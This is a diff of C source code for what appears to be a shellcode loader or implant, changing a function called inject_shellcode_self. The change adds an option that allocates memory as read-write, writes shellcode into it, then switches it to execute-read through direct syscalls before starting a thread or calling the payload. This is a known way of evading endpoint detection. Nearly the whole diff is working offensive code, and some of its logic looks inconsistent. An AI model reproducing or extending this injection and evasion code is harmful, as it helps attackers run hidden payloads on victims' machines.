@@ -34,7 +34,7 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
     #else
         sleep(sleep_time);
     #endif
-    #ifdef SELFINJECT
+    #if defined SELFINJECT && defined RX
         typedef int (*funcPtr)();
         funcPtr func = (funcPtr)shellcode;
         *phThread = 0;
@@ -51,10 +51,13 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
                 0,
                 &size,
                 MEM_RESERVE | MEM_COMMIT,
+                #ifdef RX
+                PAGE_READWRITE);
+                #else
                 PAGE_EXECUTE_READWRITE);
+                #endif
             if (NT_FAIL(status) || !allocation)
             {
-                // ERROR
                 #ifdef _DEBUG_
                 printf("ERROR: NtAllocateVirtualMemory = 0x%x\n", status);
                 #endif
@@ -66,10 +69,13 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
                 0,
                 size,
                 MEM_RESERVE | MEM_COMMIT,
+                #ifdef RX
+                PAGE_READWRITE);
+                #else
                 PAGE_EXECUTE_READWRITE);
+                #endif
             if (!allocation)
             {
-                // ERROR
                 #ifdef _DEBUG_
                 printf("ERROR: VirtualAllocEx = 0x%x\n", GetLastError());
                 #endif
@@ -93,7 +99,6 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
 
             if (NT_FAIL(status) || bytesWritten < size)
             {
-                // ERROR
                 #ifdef _DEBUG_
                 printf("ERROR: NtWriteVirtualMemory = 0x%x\n", status);
                 #endif
@@ -108,7 +113,6 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
                 &bytesWritten);
 
             if (!res) {
-                // ERROR
                 #ifdef _DEBUG_
                 printf("ERROR: WriteProcessMemory = 0x%x\n", status);
                 #endif
@@ -120,7 +124,37 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
             printf("Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
         #endif
 
-        #ifdef SYSCALLS
+        #ifdef RX
+            #ifdef SYSCALLS
+            int old = 0;
+            status = INLINE_SYSCALL(NtProtectVirtualMemory)(
+                (HANDLE)-1,
+                allocation,
+                size,
+                PAGE_EXECUTE_READ,
+                &old
+            );
+
+            if (NT_FAIL(status) || bytesWritten < size)
+            {
+                #ifdef _DEBUG_
+                printf("ERROR: NtProtectVirtualMemory = 0x%x\n", status);
+                #endif
+                return JOB_STATUS_ERROR;
+            }
+            #else
+            #endif
+        #endif
+
+        #ifdef SELFINJECT
+            typedef int (*funcPtr)();
+            funcPtr func = (funcPtr)shellcode;
+            *phThread = 0;
+            #ifdef _DEBUG_
+                puts("self executing the payload");
+            #endif
+            return (*func)();
+        #elif SYSCALLS
             status = INLINE_SYSCALL(NtCreateThreadEx)(
                 phThread,
                 THREAD_ALL_ACCESS,
@@ -136,7 +170,6 @@ NTSTATUS inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE p
 
             if (NT_FAIL(status) || !*phThread)
             {
-                // ERROR
                 #ifdef _DEBUG_
                 printf("ERROR: NtCreateThreadEx = 0x%x\n", status);
                 #endif
